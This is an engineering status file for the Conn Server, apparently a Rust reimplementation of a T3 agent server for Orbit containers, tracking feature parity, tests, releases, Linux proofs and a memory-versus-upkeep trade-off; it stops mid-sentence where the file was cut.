# Status

**The work is active.** It was parked on 2026-11-13 and Nick resumed it on 2026-11-14. This file
says where the work stands, what is proven, and what is left, in order. Keep it true: update
it with every merged step.

Since 2026-11-15 the Conn Server lives in the Conn monorepo, in `apps/conn-server`. Nothing in
Conn depends on it. Since 2026-11-16 one Orbit Project runs it in its new containers (see
"Released and running in Orbit"); the web and iOS clients were tested against it in a VM
(see "Client parity, wave 1").

**Input validators (2026-11-17):** RPC limits and MCP input decode share
`conn-support/src/input.rs` and the generator walk `tools/schema-rules.mjs`. Proof:
`tools/check.sh` 46/46, no skips; touched-crate tests pass; the original cases are unchanged.

**Known difference, stop in progress (2026-11-18):** with the provider's reply to
`turn/interrupt` held, T3 reported the run interrupted on one slow CI run (cause not proven).
Conn ends a stopped run only on the provider's terminal event: the Codex adapter awaits the
reply, then waits up to 10 s for the terminal; past that the Stop is marked unresponsive and
the run stays open. Waiting for terminal confirmation is deliberate. `idle-diff` lists the
split in `KNOWN` as `intermittent`; a gate either side misses still fails it. Whether to
match T3 is open.

## PR watching and review guides (2026-11-19)

Served: `watch_pull_request`, `unwatch_pull_request` and `read_pull_request_guide` (70 of 87
tools), and the engine commands `thread.pull-request.watch` and the server-only
`thread.pull-request-watch.sync` and `thread.pull-request-watch.checks-reopen`.
`write_pull_request_guides` stays unregistered: the server has no review guide generator
(T3 runs a model in a temporary checkout), so the tool could only fail.

- **The watch works.** A loop in the server (`methods/pull_requests/watches.rs`) reads each
  watched PR from GitHub every 2 minutes, and at once when a new watch appears, through the
  panel's client (`gh`'s login). It evaluates the read as T3's `pullRequestWatch.ts` does
  (`conn-source-control/src/pull_requests/watch.rs`) and sends one sync per thread. A change
  wakes the thread with T3's text as a `monitor` notice: a `message.dispatch` with
  `queue_after_active`, `createdBy: agent`, `creationSource: server`. Checks, approvals,
  remarks (review-thread pages included), conflicts, rebases, merge-queue removals, "no checks
  after 15 minutes", 10 comment-only wakes, closed and merged PRs, and 8 failed reads all
  follow T3. Watches live on the thread's links, so they survive a restart. Archive, settle
  and Stop end them. New watches that overflow the loop's queue ask for one more full pass.
- **Queued wakes are checked when they start** (`startNextQueuedRun`): a wake whose watches
  all ended or moved is cancelled; a wake for several PRs is narrowed to the current ones.
- **A push reopens checks.** When an agent's push command finishes (`isPushCommand`, ported
  in `conn-engine/src/push.rs`), the engine sends `checks-reopen`, which clears each watch's
  `checksPending`. A read of the old head that lands afterwards cannot restore it.
- **Guides:** `read_pull_request_guide` reads the panel's stored guide.
- **Proof.** `pr-watch-diff` (new check): 42 cases, 71 host reads, through T3's own
  `evaluatePullRequestWatch`, `pullRequestWatchMessage` and `combinePullRequestWatchWakes`
  and ours, each side feeding its own next watch forward; values equal. `parity.mjs`: 22 new
  calls of the three tools on both servers with no `gh`, values and texts compared, plus
  `tools/list`. Engine tests: a sync wakes and runs a turn; a stale sync is refused; Stop ends
  the watch; a queued wake is cancelled after unwatch and narrowed to one of two PRs (both
  fail without the fix); a `git push` row clears `checksPending` and an in-flight old read
  cannot restore it (fails without the fix). Server test: the loop on a stub GitHub sends the
  baseline, one wake for a failed check and a new comment, nothing on a quiet pass, and an
  end without a wake on merge. `push.rs` unit test: T3's own test inputs.
- **Known differences.** No GitHub change feed or watch fingerprints: news waits for the next
  2-minute sweep, and an unchanged PR is read again after 10 minutes (T3's no-fingerprint
  path). No cached review-thread tails, no watch-life log lines. The sync writes
  `thread.pull-request-synced` (whole thread) where T3 writes `thread.pull-request-link-updated`
  (one link); clients end in the same state. With no `gh` on the server, T3 refuses a watch
  with its "not signed in" text and we with "no credential" (cli-missing), as the panel
  already does; `parity.mjs` lists it as KNOWN.

## Provider sign-in (2026-11-19)

The six `provider.auth.*` methods are served, and `provider.auth.subscribe` now matches T3.
T3 has no in-app sign-in for Claude, Codex (`setupMode` other than `managed`) or Grok: their
instances carry no `ProviderAuthController`, so `ProviderAuthService` answers every call, the
stream too, with `ProviderSetupError` ("This provider does not support sign-in in T3 Code.",
or "This provider instance is no longer available." for an unknown id). It starts no CLI;
users run `claude auth login` or `codex login`, and the status probe and the `auth.json`
watch pick the result up. Our server does the same (`methods/provider.rs`). The stream
answered an "idle" state before; T3 fails it, and no client subscribes for these providers
(`setup.canAuthenticate: false` hides sign-in in web and iOS).

Proof: `crates/conn-server/tools/provider-auth-diff.mjs` (in `tools/check.sh`) starts both
servers with recording `claude`, `codex` and `grok` stubs, calls the seven methods for
`claudeAgent`, `codex`, `grok` and an unknown id (36 calls), and compares every reply and the
stub runs during the calls: all equal, no CLI run on either side. The start-up probes reach
the stubs on both sides. Not built: T3's managed Codex sign-in (`setupMode: managed`) and
`provider.chatgpt.*`. That flow is T3's own OAuth against `auth.openai.com`, with tokens in
T3's secret store; AGENTS.md "Providers" forbids it here.

## Managed access, target side (item 4)

`serve --managed-provision <file>` serves Orbit callers on a separate managed ingress and
enforces Orbit's "Managed grant revocation" contract: Gateway introspection bound to the
caller's TCP peer, ordered revisions with ACKs, an exact-edge fence of RPC sockets, streams,
HTTP reads and preview viewers, and fail-closed loss of authority (probe 1 s, lease 3 s).
`docs/managed-access.md` has the design, the lab measurements and the open readings. Proven
against a fake Gateway on loopback; not yet against a lab Gateway. Legacy peer links stay.
The task worker grant (item 6) rides on it: a fixed allowlist per admitted turn and an
engine `DispatchGuard` that checks ownership atomically with each command.

## Orbit Instance facts at startup

Conn Server reads Orbit’s existing `/etc/orbit/instance` at startup and publishes the optional
`orbitInstance` in the environment descriptor, alongside its persisted environment ID.
The descriptor requires both positive, JavaScript-safe IDs. It keeps the optional Project,
Instance and Node labels, plus a valid HTTP(S) URL. A host without the file or an older file
without both IDs still starts. The reader caps the file at 64 KiB.

The Rust tests consume the TypeScript server’s fixture and cover absent and older files,
invalid IDs and URLs, comments and values containing spaces or equals signs. This step adds
no bootstrap command. Orbit still supplies live lifecycle state and still configures the
workspace project and access separately.

## Released and running in Orbit (2026-11-16)

- **Release `conn-server-v0.1.0`** (Conn `a7755b30bd`): the release workflow's first run built
  `conn-server-0.1.0-linux-x64.tar.gz` and published it with its `.sha256`. The first tag run
  failed at checkout (`persist-credentials: false` runs `git submodule foreach`, which trips
  on a `.repos` gitlink); the write token now sits in a job of its own that only downloads the
  tarball and makes the Release (PR #96). Downloaded without a login, the digest matches.
- **Orbit side** (ADR 0258, `hardimpactdev/orbit`): a Project's `container_server` picks `t3`
  or `conn` (PR 3834); the recipe pins this release as the agent folder's part `conn-server`
  (PR 3879). On Beast the converge added the part without restarting a running server, since
  the new folder version only adds files. `conn:environment-restart` treats the SDK host as
  it treats a provider (PR 3880).
- **Live proof** (Nick chose Project 20, `nckrtl`): its clone `conn-trial` (Instance 3418 on
  Beast) runs `conn-server` 0.1.0 as `t3.service`. One Haiku turn through Orbit's
  `thread start --wait` completed, with the SDK host on the container's Node 24.22.1.

- **Task group proof (2026-11-18, 0.2.0):** Project 20's task group 5919 ran end to end on
  `conn-server` 0.2.0: a question and its answer, a Stop mid-turn, a Codex reviewer turn,
  freezes while idle and during a turn, and the Gateway's thread index. Same shapes for every
  field Orbit reads; no Conn Server defect. `docs/proof-orbit-task-group.md`.

## Client parity, wave 1 (2026-11-16)

Codex builds each slice; an independent Gemini review checks it; findings go back to the
builder with a test that fails without the fix.

- **Thread handoff** (PR #103): `t3_attachment_prepare_upload`, `t3_attachment_discard`,
  `t3_thread_send_attachments`, `create_threads`, `t3_worktree_list`, `t3_worktree_handoff`.
  `tools/check.sh` 44/44; the live comparison calls all seven tools on both servers with no
  difference. Known differences: pending upload owners cap at 4,096 and concurrent handoffs
  at 256; a sent upload frees its owner slot, so a later discard of it is refused (T3 keeps
  the owner until discard or expiry).
- **Secrets and panels** (PR #100): `secrets.answerRequest`, `panels.requests`,
  `panels.respond`, `request_secret`, `panel_open`. Secret values stay out of events and
  projections; a saved `secretRef` signs scheduled webhooks (project scope, one use).
  `tools/check.sh` 44/44. Known differences: browser URL/tab automation answers
  `capability_denied` (no desktop preview manager); secret-provider answers are not
  advertised; the panel RPCs are mounted here, while T3 leaves them unmounted.
- **GitHub only** (PR #104): source control serves GitHub alone, as Nick scoped it on
  2026-11-16. GitLab, Forgejo, Bitbucket, Azure DevOps and the others are gone (8,225 lines);
  their remotes take T3's unknown-host path, and saved settings keep only `github` in
  `sourceControlHosts` and `offeredSourceControlProviders`. `registry-diff` (8,901 cases)
  compares against T3's registry with GitHub alone. `tools/check.sh` 44/44. The canary still
  trips on the other hosts' CLIs and tokens, since the diff checks start the full T3 server.
- **Test logins and database panel** (PR #107): `testLogins.*`, `save_test_login`,
  `request_credentials` (both need the session's agent browser access, as in T3) and
  `database_query` (sent to the Mac's database panel; the server opens no database). Logins live
  in the settings secret store; passwords never enter events, projections or results. Known
  differences: at most 1,024 logins and a 16 MiB store; `fill_credential` and the site
  credential RPCs wait for the preview tabs.
- **MCP Apps** (PR #102): `mcpApps.*` and the desktop tools `mcp_call` / `mcp_connect`
  through #100's panel broker. Claude reads its App capabilities from `system/init`; forged
  `t3McpApp` results are stripped on every `mcp__*` result; failed Codex captures keep
  `isError`. Known differences: bounds on App context (256 entries per conversation, 16,384
  fork ancestors), SDK host replies (1,024) and native App calls (32 per query); capture waits
  at most 20 s per session.
- **Cleanup** (PR #110): one root fix for the stub ETXTBSY race; thread launch uses
  `fetch_base`; pull requests run the Conn Server checks on the same paths as pushes; trims
  from a retrospective review of #96-#103.
- **Pull request panel** (PRs #106, #109), GitHub only: the panel's reads and refreshes (20
  `pullRequests.*` methods and `POST /api/pull-requests/diff`) and its actions (comments,
  replies, edits, reactions, thread resolution, reviews, reviewers, labels, `update`, the
  detailed `stack`, stored review guides). GitHub goes through `gh`'s login, as in T3; 403 falls
  back to the GraphQL viewer. `generateReviewGuide` and `runAction` are registered and answer
  T3's typed `PullRequestOperationError` (guides off, or the action not available here), so the
  Mac and iPhone controls show a clear error. Known differences: no ETag revalidation,
  persistent read cache or GitHub quota reserve yet.
- **Pull request checkout** (PR #108), GitHub only: `git.resolvePullRequest` and
  `git.preparePullRequestThread` (in place or in a worktree; fork heads, deleted forks through
  `refs/pull/<n>/head`, `owner:branch` through REST, upstream tracking as T3 sets it), and the
  commit step of `git.runStackedAction` with a generated message. Push and PR creation answer
  T3's typed `GitManagerError`: in a container they are Orbit's. Known difference: no hook
  progress events.
- **HTML renders** (PR #105): `html_render` as T3 publishes it: a validated page with local
  images inlined, the shared bootstrap, a thread attachment and signed delivery with T3's CSP.
  A deleted thread's renders are removed with it. T3's `toolOutput.ts` is ported once
  (`conn_provider::tool_output`) and shared with MCP App parsing.
- **Workflows, tool search, restart** (PR #101): `orchestration.getWorkflowScript`,
  `orchestration.stopWorkflow`, `t3_workflow_stop`, `tool_search`, and `server.restart`
  (only under systemd's `t3.service` with automatic restart, and with
  `environment:maintain`). Each thread dispatches under its own lock, as in T3.
- **Headless previews** (PR #111): `html_preview`, the 13 `preview_*` tools,
  `t3_preview_list` / `t3_preview_close`, eight client RPCs and the authenticated JPEG
  stream. Orbit sets `CONN_SERVER_BROWSER_PATH` to its shared pinned Chrome bundle;
  a missing or wrong-version configured browser fails without a runtime download.
  Generated `chrome.json` exports the release pin. Limits: 32 tabs, eight per agent, four
  browser hosts, two recordings and two HTML captures. Downloads, viewer HTTP
  file transfer and clipboard are unserved; iframe snapshots fail closed; desktop relay,
  local-server discovery and stop RPCs stay unregistered. `preview_cdp_endpoint` returns
  T3's desktop-only error. Native GUI interaction and the Orbit image remain unproven.
- **Clients** (VMPal macOS VM, Conn `c969c3ebd1`): the web client (through a host T3 as a
  remote environment) and the iOS dev client in a simulator (paired straight to the Conn
  Server) each ran a Haiku turn against the Conn Server on macOS. Retested on the iOS client
  at Conn `4e37210f6b` (all slices merged): the Pulls list, a PR's overview, activity and
  diff, Work on PR (a new worktree on the PR branch, then a turn there), `html_render`
  inline, `preview_open` and `preview_snapshot` in headless Chrome, and `save_test_login`
  with `request_credentials`. MCP Apps rest on the parity checks alone.
- **Release `conn-server-v0.2.0`**: every wave-1 slice; the version bump is its own PR.

## Partly followed to Conn `444f032be7` (the 2026-11-18 sync)

`tools/follow-conn.sh --capture`, then the red checks T3's change set explains:

- Contract, tables, MCP tool names and GitHub GraphQL bindings regenerated; `gen-tools` mocks
  T3's new `IssueService` and `ThreadIssueService`.
- `thread.issue.link` and `thread.issue.unlink` are refused with a reason: this server does
  not link issue trackers yet.
- Payload scopes: `device.easAccount`, `device.simlockIdentity` and
  `server.listTextGeneratorModels` need `settings:write` and `providers:manage` when the
  payload holds a secret reference, as `requiredScopesForRpcCall` does.
- Copy: T3's "Settings → Source Control" is now "Settings → Source control & issues".

Still red:

- `round_trip`: the new `get_config` sample has `worktreeCleanup: null` in a project override.
  `optionalKey(NullOr(T))` is generated as `Option<T>`, so null is dropped. Fixing it in
  `gen-contract.mjs` changes about 2,330 fields.
- parity: `t3_worktree_status` after a handoff is an RPC error on the T3 server and `ok` here.
- On mini: claude conformance (`env: : No such file`, red on 2026-11-17 as well) and canary
  (writes to the decoy home from the CommandLineTools python cache).

## Followed to Conn `ea8a2d2e79` (the 2026-11-17 sync)

`tools/follow-conn.sh --capture`, then each red check followed as T3 does it:

- Contract and generated tables regenerated (T3 server version 0.1.10).
- Assets: `environment-theme-background` (#36680) is answered "not found": this server
  publishes no environment themes, so no theme has a background.
- Payload limits: T3's theme id pattern starts with a negative lookahead, which Rust's regex
  lacks; a leading `^(?!X)` now compiles to a deny regex beside the allow regex.
- Thread titles: title instructions replace the 3-8 word length rule and go under "Title
  instructions from the user:" (#37565).
- On macOS (mini) `cargo clippy` flags `use super::*` in `conn-preview/src/html.rs` tests,
  whose only test is Linux-only; Linux CI is unaffected.

## Followed to Conn `a7755b30bd` (the 2026-11-16 sync)

`tools/follow-conn.sh --capture`, then each red check followed as T3 does it:

- Terminals: a failed shell start keeps its error for later attachments (#37088); `binary`
  writes are one byte per UTF-16 unit (#37223); a terminal query reply reaches the shell only
  from the first attached viewer that answers, until it detaches (#37233).
- `/mcp`: tools that act as the calling thread are hidden from outside clients
  (`hiddenFromOutsideClients`, #32764 and Conn's sync): missing from their `tools/list` and
  "not found" when called (`gen-tools.mjs` writes `src/outside-hidden.txt`; `parity.mjs`
  checks both servers hide the same tools). Threads say `pinned` (#32727);
  `run_scheduled_task_now` returns `lastRunError` (#37149).
- Source control: `host:repo` remotes with one path part read as SSH (#31781); Forgejo's
  change request host comes from the resolved web URL first (#29784).
- Codex: full access sends the granular approval policy that keeps MCP prompts, accepts an
  MCP access prompt without asking, and cancels (not declines) one it cannot answer (#37104);
  `delegate_task` joins `t3_thread_wait` on the direct-only server (#30019); title runs turn
  hooks off and drop a launch arg that enables them (#35203).
- Claude: a Monitor that starts is awaited (#37085).
- Grok: a completed turn keeps the rows of its background commands, so a dev server that
  keeps running no longer holds the run open, and its later output and end land on that run
  (#32109).
- Known difference: T3's `thread_not_found` text adds a hint about linked environments
  (#31946); this server serves none, so it does not name `t3_environment_links`
  (`thread-cli-diff.mjs`, `KNOWN_TEXT`).

## Moved into the monorepo (2026-11-15)

The history of `hardimpactdev/conn-server` (main at `e336738`) came in with `git subtree`.
`conn.pin`, `CONN_MONOREPO`, `tools/conn-checkout` and `tools/bump-conn.sh` are gone: the tools
read the monorepo two levels up, and `tools/follow-conn.sh` regenerates and reports.

- **Proven:** with the monorepo at the old pin (`b12470dcad`) and the move applied,
  `tools/check.sh` passes 44 of 44, none skipped, the canary clean (macOS).
- **Followed to Conn `9efd55e5cb`** (the 2026-11-15 sync), on this tree: the review diff's
  `changeType` from `--raw` records (T3 #33310); one spelling of escaped repository paths,
  Azure keys that keep `.git`, IPv6 SCP hosts (`canonicalRepositoryPath`, #36929);
  Claude's `Stop` hook and `rename_session` (#30646, #34775); POSIX `PATH` entries keep their
  whitespace (#33840); Monitor commands in the background roster (#37019); the Codex
  conformance harness provides `PortDiscovery` (#36501); `/mcp` list limits clamp instead of
  refusing (#30976, in `parity.mjs`); Codex todo items complete with each update (#22617) and
  ACP subagent replies flush every 400 ms (#29422), both in the provider replays. Not followed: Claude goals (the Stop hook answers `{}`),
  the native `/rename` retitle (#36879), Codex's stopped-command wake rule (#36501), and four
  `/mcp` changes whose new definitions are served but whose behaviour no check covers:
  `delegate_task` waits at most 45 s and reports `starting` (#15622), `delegatedFrom` in the
  thread list and read (#36961), and scheduled tasks that return `webhookUrl` only on
  creation and take a `scheduledTaskId` filter (#27716). See
  `crates/conn-provider-claude/README.md`, "Known differences".
- The nightly sync follows the Conn Server (Nick, 2026-11-16; `docs/upkeep.md`, "In the nightly sync").
- **CI on Linux** (PR #95): `methods.json` names a digest of the contract inputs
  (`contractDigest`, sha256 over the tracked files) instead of a commit id, which a shallow
  checkout cannot give and a squash merge rewrites. `parity.mjs` seals the T3 server's `PATH`.
  ACP agents stop on Linux as in T3 (`terminatePosixOwnedProcessTree`, in
  `conn-provider-support/src/process_tree.rs`): descendants first, then the root; the probe
  closes stdin before the stop. The Claude stubs save their records atomically. The Codex
  `old-cli` probe scenario is gone: only the latest CLIs matter (Nick, 2026-11-15), and its
  result was a race in T3 on Linux.
- **Continuations and the checkpoint follow T3's order** (`conn-engine/src/runner.rs`).
  `claude_background_subagent_after_root` failed 5 of 5 on Linux: the wake turn started
  before the subagent's report was stored. T3's own replay of it shows two things. Its
  adapters offer a continuation to a queue apart from their events, which is dispatched at
  once; the engine now reads the events already in the channel and dispatches a continuation
  among them first. And its capture completes the run after the events the adapter had
  already sent; a capture here now waits until the pump stored the events waiting when it
  finished (never for later ones, so running background work holds nothing: T3 completes a
  run while another subagent still runs). A hold until background items settled broke
  `idle-diff` and three fixtures and was dropped.
- **`turn_interrupt` under load:** the replay driver's `await_run_steerable` also waits for
  the start to be accepted (`Engine::run_start_accepted`). T3 stores a provider turn only
  after acceptance; ours can show Claude's turn before ("Stop during a turn start"), and a
  Stop then took the before-start branch.
- **Proof:** the fixture replay, every result as expected (Claude 34 of 34) in 6 runs on
  Linux and 3 on macOS; `idle-diff` no difference on both.

## Why it was parked for a day, and what that means

Nick parked the work on 2026-11-13 and resumed it on 2026-11-14, knowing the facts below. They
stay here because they are the honest picture of what this server buys and what it costs.

The goal is memory. Each Orbit Instance container runs its own T3 server, and that server
holds about 300 MiB of private memory, also when idle.

Measured on Beast on 2026-11-13, with 54 containers and none active:

| | Per container (median) | All 54 |
| --- | --- | --- |
| Whole container (`Pss`) | 349 MiB | 23.5 GiB |
| T3 server | 300 MiB | 16.0 GiB |
| Everything else | 47 MiB | 7.5 GiB |

The Conn Server removes almost all of the T3 server's share: it idles at about 3 to 5 MiB. But
the same memory can be saved without a second server: stop the T3 server (or the whole
container) when it is idle, and start it on connect. A stock T3 server was ready 1.8 seconds
after its start on Beast, with a fresh state.

| | Conn Server | Stop the idle T3 server, start it on connect |
| --- | --- | --- |
| Memory saved on idle containers | about 16 GiB | about 16 GiB; up to 23.5 GiB if the container sleeps |
| Wake delay | none | about 2 s for the server |
| Parity with upstream | re-implement every upstream server change, forever | none: it is the T3 server |
| Speed of agents and tools | the same: the time is in the model and the CLI | the same |

Upstream changed the server and its contracts 2,145 times in the 30 days before the pin
(53 RPC methods added, 13 removed). The engine and the provider adapters are about three
quarters of that change, and those parts cannot be generated. That upkeep is the real cost of
this server, and it is the reason for the stop.

The Conn Server still wins on two points: no wake delay, and about 250 MiB less while a thread
is active. If those start to matter, or if Conn needs server features that collide with the
nightly upstream merge, this work is the starting point.

Not measured: a T3 server's start time with many stored threads; the `claude` process and its
MCP helpers inside a container (on a Mac: 145 MiB with minimal settings, 294 MiB with a user's
settings; about 140 MiB for the `claude` program alone).

## What exists

`main` is in a working state. `tools/check.sh` passes 39 checks with `CONN_MONOREPO` set (Conn `b12470dcad`, 2026-11-14). The branch with the container checks passes 41: `idle-diff` and the canary added. The Codex probe and wake branch (2026-11-15, merged with `main` at 958e748) passes 43: `codex model catalog --check` and `codex probe conformance` added; the canary is clean. The branch that seals hand runs (`t3/seal-cargo-hand-runs`, 2026-11-15) adds `sealed-run`: 44 pass, none skipped, the canary clean (`check exit: 0`). The branch with provider instance settings passes 37 (`instances-flow` added).

| Part | State |
| --- | --- |
| RPC methods | 102 of 236 served; 102 have a run that the real client's decoders accept |
| Engine commands | 43 of 56 |
| T3 testkit fixtures through this engine | 69 of 159 variants pass T3's own assertions (Claude 34 of 34, Codex 25 of 25, Grok 10 of 15; the other 85 are providers this server does not offer) |
| HTTP routes | 17 of 57 (the 4 of `/api/hooks/:hookId/:token`) |
| `/mcp` tools | 34 of 87 |
| Providers | Claude, Codex and Grok (with background work and subagents), of the 10 the T3 server has without Pi |

Proven:

- **Claude** runs through Anthropic's official Claude Agent SDK in the SDK host
  (`helpers/sdk-host`). In 21 scenarios (and one more with `JAVA_HOME` set) the `claude` CLI
  gets the same argv, environment (with the login shell's `PATH`, `__MISE_DIFF` and
  `JAVA_HOME`) and stdin as from the T3 server. 18 of the T3 server's 39 Claude transcripts pass (all that the
  driver runs). 11 live tests
  pass on Claude Haiku on macOS.
- **Codex** runs on `codex app-server`, as in the T3 server, subagents included. 43 scenarios
  show no difference, 24 of them the T3 server's own recordings; three of them compare a
  thread title through `codex exec`. **No live Codex turn has run.**
- **Provider instances** (Claude and Codex) follow `providerInstances` at start and on every
  change, as in the T3 server; proven through the server on recording stubs
  (`instances-flow.mjs`) and per field by the conformance checks. See "Provider instance
  settings for Claude and Codex".
- Orbit's container flow (start, add a project on the running server, a Swamp session, a
  thread through `/mcp`, wait, read, revoke, SIGTERM with no child left) passes on the fake
  provider and once with a live Haiku turn, on macOS.
- Orbit's task-turn path (`task-copy-turn.yml`, `t3_copy_rpc.mjs`): the `t3 thread` commands,
  a repeated `--scope`, `auth session issue --json` and `model-manifest.json` give what the
  T3 server's own `t3` gives, on macOS (`thread-cli-diff`, `model-manifest-diff`; see "Orbit's
  task-turn path").
- **The real web client with a live model** (2026-11-14, macOS, Claude Haiku): all 22
  scenarios of `fixtures/recorder/rust-scenarios.sh live` passed, each checked by its result
  (a reply, a file in the worktree, a diff line, a key on disk), and 16 of them also on the
  fake provider (`rust-scenarios.sh fake`). Covered: pairing, turns, a restart with a second
  turn, an approval, Stop during a tool call and the next turn after it, VCS, files (also in a
  worktree), terminal, settings secrets across a toggle and reloads, search, `/mcp`, an image,
  a subagent's child thread, steer, queue, a model switch, archive and unarchive, a project
  added at run time, two clients on one thread. The `ts-` pairs ran against the T3 server.
  Three defects found and fixed: a background-task wake shown as a message; no effort menu and
  no legacy models in the picker; `/mcp` `orchestrator_capabilities` listing legacy models and
  no options. The differences that remain are under "What is left".
- Memory on macOS arm64, in a live session (`rust-memory`): the server 6 to 7 MB private
  (12 to 15 MB RSS); the SDK host 52 to 56 MB private (97 to 114 MB RSS) while a Claude session
  is open, and no Node process after the idle session closed.

- **On Linux** (Beast, Ubuntu, x86_64, kernel 7.0; 2026-11-13 and 2026-11-14). The whole
  workspace test suite passed 20 times on the gnu target and 5 times on the musl target with
  no failure, after four fixes from this pass: a busy terminal chunk now holds at most the
  64 KiB window by T3's charge, as T3's `takeBatch` (it sent 70 KB chunks before; 2 failures
  in 40 runs on 2 CPUs before the fix, 0 in 100 after); shells start with default signals, as
  node-pty starts them (a server started with SIGINT ignored gave shells whose commands
  ignored Ctrl-C: the exact symptom of the first pass's one Ctrl-C test failure, which
  otherwise did not come back in 1,050 runs under load); the terminal label follows the
  foreground command's name, as in T3; and the SDK host build installs esbuild from a
  lockfile only. Also proven: the process group kill reaches grandchildren; `--bootstrap-fd`
  reads a socket pair as Electron passes it; the musl binary is static (15.7 MB) and starts;
  the CI command for the recordings decode passes with `--locked`; the SDK host builds as a
  Node 26.12.1 single executable (152 MB) and exits after the last session; 10 of the 11
  live Claude tests pass on Haiku through that executable (before the 2026-11-14 pin bump;
  after it, the provider's 42 tests and the memory run pass through the rebuilt executable). Memory (the table in
  `README.md`): the server holds 4.3 MiB `Pss_Anon` after 20 turns in 3 threads on the fake
  provider, against about 301 MiB for each of five container T3 servers at the same moments.

Not proven:

- **Linux, in part.** Two passes on Beast (Ubuntu, x86_64, kernel 7.0), on 2026-11-13 and
  2026-11-14, proved what is listed under "On Linux" above. Not proven on Linux: the agent
  systemd scope (not built; see below); the live permission test (it runs Claude with an
  isolated config folder that carries only `apiKeyHelper`, and on Beast that folder cannot
  sign in, so the turn ends without an approval); a live Codex turn; CI itself (the workflow
  changes ran only as the same commands on Beast); Orbit in a real container with a real
  provider (with stand-ins it passed on 2026-11-15, "Proof on Beast"); the cause of
  the one `clears_and_reports_the_foreground_command` failure of the first pass (see above).
- **The agent systemd scope on Linux.** The T3 server (`apps/server/src/process/agentScope.ts`,
  `packages/shared/src/AgentScope.ts`) wraps `claude` (a native binary given as
  `pathToClaudeCodeExecutable`), `codex app-server` (shared, `OOMPolicy=continue`) and every
  terminal shell (`app-t3code-agents.slice`, as it survives restarts) in
  `systemd-run --user --scope` units, when `XDG_RUNTIME_DIR`, `systemd-run` and `systemctl`
  are there and a probe scope starts. Before the first scope it stops a populated
  `app-t3code-agents-<sha256(stateDir)[:12]>.slice` and runs `systemctl --user set-property
  --runtime` on `app-t3code-agents.slice` (`MemoryHigh`, `MemoryMax` from RAM) and
  `app-t3code.slice` (`CPUWeight=10 IOWeight=10 TasksMax=25%`). It stops a scope after its
  agent exits, kills a thread's scope through `cgroup.kill`, and reports an OOM kill. Without
  systemd it still runs each agent through `/bin/sh -c` with `oom_score_adj` 800. None of
  this is built here. It cannot be tested on Beast: Beast's user manager also runs the
  owner's host T3 server, and the probe and `set-property` change the same slices that
  server uses. A test needs a Linux host or VM whose user manager runs no T3 server; then
  port both files, compare the wrapped argv for `claude` and `codex` with the T3 server's on
  Linux (the conformance stub records argv), and test OOM and kill there.
- Conn desktop and mobile against this server.
- Orbit's flow in a real container with a real provider (with stand-ins it passes: see "Proof
  on Beast").
- Codex on CLI 0.166 or 0.167 (the recordings are from 0.156).

## Release tarball for Orbit (2026-11-15)

**An Orbit Project can get the Conn Server from one tarball, the way it gets `t3`.** Nick
decided on 2026-11-15: a Project chooses the T3 server or the Conn Server; only the binary
differs. Details, the recipe entry and the proof: `crates/conn-server/DROP-IN.md`, "Release
tarball for Orbit".

- `tools/release-tarball.mjs` builds `conn-server-<version>-linux-x64.tar.gz` (Linux
  x86_64): the musl binary and `sdk-host/` with only the Claude Agent SDK in `node_modules`.
  10.1 MB; the binary is 23,089,112 bytes. Same input, same bytes.
- The server now also finds `sdk-host/index.mjs` beside its real binary (after Orbit's `bin`
  link), and runs it with `node` from `PATH`. A unit test covers the lookup.
- `.github/workflows/conn-server-release.yml`: a tag `conn-server-v<crate version>` builds it
  and makes a GitHub Release with the `.sha256`. The first release is `conn-server-v0.1.0`
  (see "Released and running in Orbit").
- Proven on Beast in the `conn-proof` container, no model: Orbit's unpack, owner and mode
  steps; `conn-server` as `agent`; `serve` ready; the server's Claude status probe started the
  bundled SDK host under the runtime folder's Node 24.22.1, which loaded the SDK and started a
  stub `claude` with the SDK's argv.
- Node: the T3 release embeds Node 26.12.1 and runs the SDK there; in Orbit our SDK host runs
  on Node 24.22.1 (its floor is 24.10). CI tests on 26.12.1. A live Haiku turn on 24.22.1
  passed in Orbit on 2026-11-16.
- `tools/check.sh` with `CONN_MONOREPO` (macOS): 44 pass, none skipped, the canary clean
  (`check exit: 0`). `toolchain pin` now also reads `release.yml`.
- The Orbit side is built (ADR 0258): see "Released and running in Orbit".

## Proof on Beast (2026-11-15)

**Orbit's container flow and task-turn path work on this server in a container made from
Orbit's own Instance image, after two fixes found here.** Before the fixes the server aborted
5 minutes after every start, and a turn cut by `systemctl restart` was lost. Nick allowed the
proof on Beast; everything ran in the Incus project `conn-server-proof`, which Orbit does not
know. No model was called. `claude` and `codex` were stand-ins. No credential was in the
container. The scripts are in `/tmp/conn-linux-proof` on Beast (`proof.mjs`, `hib.mjs`,
`compare.mjs`).

**The Linux pass** (the branch at `958e748`; Rust 1.99.1 as pinned). `tools/check.sh` without a
Conn checkout: 8 of 8 checks pass, the canary included. `cargo test --workspace`: 5 of 5 runs
green, 915 tests each (918 with the new tests). The canary works on Linux: it caught a decoy
read in a negative test and passed a clean run. Could not run: the 31 checks that need
`CONN_MONOREPO`, `cargo deny` (not installed on Beast), `instances-flow` (needs `npm ci` in the
SDK host). A loop of `cargo test` outside `check.sh` failed one terminal test 5 times of 5: it
kept `SHELL=/usr/bin/zsh` with an empty `HOME`, and zsh's first-run wizard ate the test's input.
That is the harness, not the server; `check.sh` gives tests a stand-in shell.

**The container.** Orbit's image `orbit-instance` (`455fc389e9e5`, 195 MiB, no credential file)
copied into the project; one container with Orbit's limits shape (4 CPUs, 4 GiB here), Orbit's
`t3.service` unit and drop-in, Orbit's agent bundle and runtime folder mounted read-only as
Orbit mounts them, our musl binary as `/opt/orbit-agent/current/agent/bin/t3`, and the stock
`t3` (T3 0.1.7, Orbit's bundle) beside it. Files written before the start as
`instance_clone.py` writes them, with the task copies' five `claude*` provider instances.

**Orbit's steps, ours against the stock server, same container** (42 steps, each command as
Orbit's scripts issue it, through `incus exec`): every step has the same exit code or HTTP
status on both, and every field Orbit's scripts read has the same value or form:
`clone-t3` (unit start, two `auth session issue --token-only` while the server starts, the
readiness `curl`, `project add`), `clone-sessions`, the Gateway's registration, the hourly
renewal, the thread index, pairing, the held session (`/oauth/token`), revocation
(`subscribeAuthAccess`, `clients/revoke`, `pairing-links/revoke`), and the task turn (model
check, `thread start|send|list|show`, a turn that asks with exit 2, `t3_copy_rpc.mjs` read and
interrupt, no session left). Differences Orbit reads nothing of: key order, fields one side
has and the other lacks (the descriptor's capabilities, `projects[].repositoryIdentity`,
`pullRequestCount`), id forms (`project:<hex>` and `mcp:launch:<uuid>` against UUIDs; Orbit
